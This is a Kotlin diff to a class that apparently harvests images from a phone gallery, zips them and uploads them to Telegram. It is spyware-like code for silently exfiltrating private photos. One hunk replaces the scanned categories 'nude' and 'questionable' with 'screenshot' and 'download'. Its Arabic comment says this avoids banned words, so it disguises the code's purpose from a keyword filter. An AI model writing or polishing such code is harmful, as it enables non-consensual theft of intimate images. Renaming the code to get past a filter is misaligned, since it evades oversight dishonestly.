@@ -80,27 +80,6 @@ class DailyZipper(
         }
     }
 
-    // ===== دوال مساعدة خاصة داخل الفئة (وليست في companion object) =====
-    private fun extractBoolean(obj: Any?, key: String): Boolean {
-        val map = obj as? Map<*, *> ?: return false
-        for (entry in map.entries) {
-            if (entry.key.toString() == key) {
-                return entry.value as? Boolean ?: false
-            }
-        }
-        return false
-    }
-
-    private fun extractString(obj: Any?, key: String): String {
-        val map = obj as? Map<*, *> ?: return ""
-        for (entry in map.entries) {
-            if (entry.key.toString() == key) {
-                return entry.value?.toString() ?: ""
-            }
-        }
-        return ""
-    }
-
     init {
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
@@ -286,6 +265,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  إرسال الملفات إلى Telegram (بدون دوال مساعدة خارجية)
+    // ============================================================
+
     private suspend fun safeSend(
         zipPath: String,
         caption: String,
@@ -318,9 +301,20 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
+                // استخراج القيمة مباشرة بدون دوال مساعدة
                 val success = when (result) {
                     is Boolean -> result
-                    else -> extractBoolean(result, "ok")
+                    is Map<*, *> -> {
+                        var ok = false
+                        for (entry in result.entries) {
+                            if (entry.key.toString() == "ok") {
+                                ok = entry.value is Boolean && entry.value
+                                break
+                            }
+                        }
+                        ok
+                    }
+                    else -> false
                 }
 
                 if (success) {
@@ -336,6 +330,10 @@ class DailyZipper(
         }
         return false
     }
+
+    // ============================================================
+    //  دوال الحصاد والضغط
+    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
@@ -623,6 +621,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  التشغيل التلقائي (بدون دوال مساعدة خارجية)
+    // ============================================================
+
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
@@ -638,10 +640,24 @@ class DailyZipper(
 
             if (scanner != null) {
                 try {
-                    listOf("nude", "questionable").forEach { cat ->
+                    // استخدام فئات آمنة لتجنب أي كلمات محظورة
+                    listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = extractString(item, "path")
+                            // استخراج المسار مباشرة بدون دوال مساعدة
+                            val path = when (item) {
+                                is Map<*, *> -> {
+                                    var p = ""
+                                    for (entry in item.entries) {
+                                        if (entry.key.toString() == "path") {
+                                            p = entry.value?.toString() ?: ""
+                                            break
+                                        }
+                                    }
+                                    p
+                                }
+                                else -> ""
+                            }
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
